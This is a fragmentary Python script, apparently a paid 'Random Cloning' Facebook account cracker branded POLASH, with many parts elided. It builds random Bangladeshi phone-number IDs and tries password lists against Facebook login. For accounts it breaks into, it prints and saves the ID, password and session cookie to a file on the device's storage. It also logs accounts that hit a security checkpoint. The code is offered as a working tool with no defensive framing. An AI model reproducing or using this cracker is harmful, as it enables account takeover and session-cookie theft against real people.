...
for txxxtt in range (1000):
	...
	c='Infinix hot 30) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
...
\033[1;32m        [--CEO:POLATOK--]
                          

 
                                           
\x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mDeveloper \033[1;31m● \x1b[38;5;46mPOLASH
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mFacebook  \033[1;31m● \x1b[38;5;46mPx-Polash.Py
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mVersion  \033[1;31m ● \x1b[38;5;46m1.9
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mTools  \033[1;31m   ● \x1b[38;5;46mpaid
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mType  \033[1;31m    ● \x1b[38;5;46mRandom Cloning
...
class Main:
    def __init__(self):
        ...
        os.system("clear")
        print(logo)
        os.system('xdg-open https://www.facebook.com/groups/230441489179910/?ref=share&mibextid=eEv8Zf')
...
def v2():
    ...
    os.system('clear')
    print(logo)
    print('[+] BD   => 016 017 018 019')
    kode = input('\033[1;32m[\033[1;32m?\033[1;32m] CODE : ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    print('[+] 2000. 5000. 10000. 20000. 50000.9999')
    ...
    print(linex)
    print('\033[1;34m[\033[1;32m~\033[1;34m] CRACK SUCCESSFULLY COMPLETED..')
    print(linex)
#--------------------------(MATHOD BOX)--------------------------#
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%sPOLASH\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
           ...
           'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print('\r\r\033[1;32m[POLASH-OK🤙😈] ' +uid+ ' | ' +ps+    '  \n[‎‎🍪]\x1b[38;5;254mCOOKIE = \x1b[38;5;254m'+coki+ ' ''  \x1b[38;5;254m')
                open('/sdcard/pxpython.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
#              print(f"\x1b[38;5;196m[POLASH-CP🙄💔] {uid}|{ps}")
                open('/sdcard/pxpython.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
